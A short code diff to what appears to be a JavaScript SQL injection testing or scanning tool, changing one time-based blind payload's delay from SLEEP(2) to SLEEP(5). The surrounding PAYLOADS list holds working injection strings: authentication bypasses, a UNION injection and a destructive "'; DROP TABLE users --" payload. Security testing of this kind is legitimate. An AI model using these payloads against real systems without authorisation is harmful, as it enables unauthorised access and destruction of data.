@@ -10,7 +10,7 @@ const PAYLOADS = {
     { value: "' OR 1=1 --", description: 'Comment-based SQLi' },
     { value: '" OR "1"="1', description: 'Double-quote bypass' },
     { value: "' UNION SELECT NULL,NULL --", description: 'UNION-based injection' },
-    { value: "1' AND SLEEP(2) --", description: 'Time-based blind SQLi' },
+    { value: "1' AND SLEEP(5) --", description: 'Time-based blind SQLi' },
     { value: "'; DROP TABLE users --", description: 'Destructive SQLi (detection only)' },
     { value: "1 OR 1=1", description: 'Numeric parameter bypass' },
     { value: "admin'--", description: 'Auth bypass pattern' },
